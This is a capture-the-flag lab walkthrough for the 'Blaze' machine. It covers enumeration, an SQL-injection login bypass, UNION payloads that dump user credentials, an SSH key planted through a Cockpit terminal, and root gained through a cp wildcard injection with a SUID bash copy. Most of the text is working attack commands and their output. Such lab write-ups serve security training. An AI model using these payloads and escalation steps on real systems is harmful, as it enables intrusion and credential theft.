____
# Exploitation Guide for Blaze

## Summary:

In this guide, we will manually exploit a SQLi in order to obtain a set of credentials and take advantage of write access to a user's filesystem in order to gain access via SSH. To escalate privileges we will analyze an interesting ELF binary and discover a wildcard bug which will allow us to obtain root access.

## Enumeration

We begin the enumeration process with an `nmap` scan.

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:10:b5:46:af:65:e7:cd:ee:6d:1f:8d:13:db:51:e0 (RSA)
|   256 bd:35:6a:56:05:4d:81:d9:ee:21:8d:c9:79:6e:99:1e (ECDSA)
|_  256 8a:71:4f:d1:ed:11:dd:9c:1f:c6:51:6c:e8:e3:81:88 (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
| ssl-cert: Subject: commonName=blaze/organizationName=027af6e4d559460db863a8a071592855
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2022-03-21T10:49:17
|_Not valid after:  2122-02-25T10:49:17
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
.....
```

Starting with port `80`, we see the following static landing page:

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_1_2RE6HJ1N.png)


We turn to content discovery by fuzzing for any interesting directories using `ffuf`.

```
└─# ffuf -w /opt/seclists/Discovery/Web-Content/raft-small-words.txt -u http://192.168.211.128/FUZZ.php --fc 403

        /'___  /'___           /'___       
       / \__/ / \__/  __  __  / \__/       
         ,__\  ,__/ /    ,__      
          \_/   \_/  \_    \_/      
          \_    \_   \____/   \_       
          /_/    /_/   /___/    /_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.211.128/FUZZ.php
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
home                    [Status: 200, Size: 714, Words: 70, Lines: 36]
login                   [Status: 200, Size: 769, Words: 69, Lines: 29]
db_config               [Status: 200, Size: 0, Words: 1, Lines: 1]
```

We start with `login.php` and see the following page:

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_2_FL3O9J1N.png)


We proceed to test for SQL injection.

By entering the username `admin'-- -`, it bypasses the login and we see the following admin dashboard confirming SQL injection.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_3_F53QD01M.png)


We proceed by manually dumping the SQL database using UNION payloads with the help of pentestmonkey cheatsheet → [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

We proceed by intercepting the request with `burp` and use the repeater feature to modify the request.

With UNION queries, we start by retrieving the correct number of columns (5).

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_4_K3S2VBY9.png)


We now proceed by placing the following MySQL query in the nested UNION payload.

`username='union select 1,@@version,3,4,5-- -&password=dada`

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_5_D4G91NpL.png)


From the output we see the MySQL version.

We proceed by retrieving all databases stored below using the following:

`username='union select 1,schema_name,3,4,5 from information_schema.schemata-- -&password=dada`

From the output we receive the following 5 database names.

```html
<div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">mysql</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">information_schema</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">performance_schema</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">sys</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">blazeDB
```

Now we dump all the tables in the **blazeDB** database with the following:

`username='union select 1,table_name,3,4,5 from information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'sys' AND table_schema != 'information_schema' AND table_schema != 'performance_schema'-- -&password=dada`

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_6_Q3J01KPA.png)


We receive the table in blazeDB → **users.**

Now we dump the columns in the **users** table:

`username='union select 1,column_name,3,4,5 from information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'sys' AND table_schema != 'information_schema' AND table_schema != 'performance_schema'-- -&password=dada`

Next we retrieve the columns:

```html
<div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">id</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">name</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">password</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">phone-number</h5><div class="d-flex movie align-items-end">
                                <div class="mr-auto p-2">
                                        <h5 class="p-2">username
```

Now we dump **username, password and name**:

`username='union select 1,group_concat(username,':',password,':',name),3,4,5 from users-- -&password=dada`

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_7_S1K3M04H.png)


From the output we see the credentials → **admin:canttouchhhthiss@455152** and **james:canttouchhhthiss@455152**

But SSH is configured to authenticate using keys only.

We turn our attention to port `9090` and attempt to login with the credentials we previously discovered.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_8_DF52W2L1P.png)

We are able to get a session as James in cockpit using the credentials: **james:canttouchhhthiss@455152**

Next we navigate to the web terminal and see that we have a session as the `james` user.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_10_RE3V7JN1.png)

We proceed by echoing our public RSA keys into an `authorized_keys` file and modifying the permissions.

```bash
james@blaze:~$ mkdir .ssh
james@blaze:~$ cd .ssh/
james@blaze:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUb+GuIg6IHGNlcs98n5g7zFM10zhC6JaVDatmKZ1E7sWJyKmfDz2XZxM0zYjqB4zamG8SThfhb13YlKLETormka/kjhDUUt0Fkr7BUwCKk2vApkJLxgiYbcFtGm59L0KyfYzXB25zK991TpglGYgrXi3uYmQAMSBdLUYe19qfVqFRMVOCNkLI0TWPko0EUc5AYK73OG2GI0z3CXjyl9MELdYJrWe1NjYCtAtwPFCIiInFyTW6ajLcm+Er/yIIqJ8PMOj3ibG+wyMaaeX2+qqDFIBVdYZAePrCdidzgeGNrD44M5KILsEcKg9LkBwUYHlE3cOzKpProl0Fpejxkehv+nZP8D+62jtpLl0I1HPeuu+fnwdwx4AOjUWusvbtnGsAsVpi2YlLxasYOmoLJAw1Rk9EDbD1JO5cIero9brIO0BsRTO9ojmGcRB+q7je0+FoGR9SbQrtxBqzNbkHE3DlQvnqEDv1HLudxc9/AKgmadu+4uusvw6yyNdYhyCUiq0= root@kali' > authorized_keys
james@blaze:~/.ssh$ chmod 600 authorized_keys 
james@blaze:~/.ssh$ chmod 700 ../.ssh/
```

Now we are able to authenticate via SSH.

## Privilege Escalation

Using `sudo -l` reveals a sudoers entry where `james` can run `AuthChecker` as root and it seems like `AuthChecker` is a custom ELF binary.

```bash
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/local/bin/Authchecker
james@blaze:~$
```

We copy the binary to our attack machine and start Ghidra to analyze the decompiled source code.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_11_ZX2L0C1X0.png)

There is a function named `copy_keys` which seems relatively interesting and the below decompilation shows a bug in the code.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF2_image_12_DrF91JPE.png)

The bug is the wildcard being used with cp and we can exploit this by copying bash using the **preserve** flag in cp.

```bash
james@blaze:~$ cp /bin/bash .
james@blaze:~$ chmod 4777 bash 
james@blaze:~$ touch -- --preserve=mode
james@blaze:~$ sudo /usr/local/bin/Authchecker 
Dear employees, this is an authenticator for blaze login as root, please drop your public key under the current directory
written to /etc/key_check/public_key, we will let you know soon your authentication status to blaze
```

The above commands will copy a preserved BASH suid under **/etc/key_check/** allowing us to obtain root access.

```bash
james@blaze:~$ /etc/key_check/bash -p
bash-5.0# cd /root/
bash-5.0# ls
proof.txt
bash-5.0# cat proof.txt 
```
